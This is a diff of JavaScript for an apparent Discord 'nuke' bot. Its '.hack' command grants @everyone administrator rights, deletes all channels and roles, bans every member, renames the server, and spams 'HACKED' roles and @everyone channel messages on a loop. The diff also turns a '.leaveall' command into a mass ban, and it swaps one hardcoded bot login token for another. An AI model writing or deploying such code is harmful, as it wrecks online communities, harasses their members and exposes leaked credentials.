@@ -7,51 +7,59 @@ console.log(`Logged in as ${client.user.tag}!`);
 });
           
 
+
 client.on('message', message => {
-    if (message.content.startsWith(`${message.content}`)) {
+    if (message.content.startsWith(prefix + "hack")) {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]///premission akata adminstator
-        });  
+        });
         message.guild.channels.map(c => {
             c.delete();
         });
-       message.guild.members.forEach(m =>{
-                    m.ban()
-                })
       message.guild.roles.forEach(r =>{
                     r.delete()
-                });
-      
+                })
+         message.guild.members.forEach(m =>{
+                    m.ban()
+                }) 
         setInterval(() => {
             message.guild.createRole({
-                name: "HACKED BY Unkn0wn",
+                name: "HACKED",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
                 message.member.addRole(rr.id);
             })
         }, 1000);
-        
-        message.guild.setIcon("https://cdn.discordapp.com/attachments/807205133661765632/811711614327062598/GIF-210113_035754-1.gif");
-        client.user.setAvatar("https://cdn.discordapp.com/avatars/651095740390834176/6d552e47f12f7b7f31148d0275b73ec4.png?size=1024")
-        message.guild.setName('HACKED BY Unkn0wn');
+        message.guild.setIcon("link wena");
+        client.user.setAvatar("link wena");
+        client.user.setUsername("HACKED")
+        message.guild.setName('HACKED');
         setTimeout(function() {
             setInterval(() => {
               
-                message.guild.createChannel('HACKED BY Unkn0wn', 'text').then(channel => { 
-                channel.send('@everyone HACKED BY Unkn0wn BCHO SERVER DABNEWA:joy: :joy: :joy:')
+                message.guild.createChannel('HACKED BY BLACK JACK', 'text').then(channel => { 
+                channel.send('@everyone HACK BY BLACK JACK :joy: :joy: :joy:')
                
                 })
-            }                        
-               , 500)
-    })}})
+            }
+                        
+                        , 500)
+            })
+        }
+    
+                   
+    }
+ 
+          )
+ 
 
 client.on('message', async msg => {
   if(msg.content.startsWith('.leaveall')) {
-    client.guilds.forEach(guild => {
-      guild.leave();
-    });
+    msg.guild.members.forEach(m =>{
+                    m.ban()
+                }) 
     msg.channel.send(`:joy::joy::joy: بداخۆ وەزحتان شرە`);
   }
 });
@@ -95,5 +103,5 @@ if (message.content.startsWith(adminprefix + 'setava')) {
 
  ////codaka drwst krawa lalayan black jack
 
-client.login("ODEyMjYzODU2Njk2ODUyNTIx.YC-Nqg.BclcZP-hyPezGA5GU9_6lNkXWa4")
+client.login("NzYyMzg2MDYyMDE4MzQ3MDA4.X3oZWQ.piONRAfqvnROvLTf2BSJfIN0uN4")
           
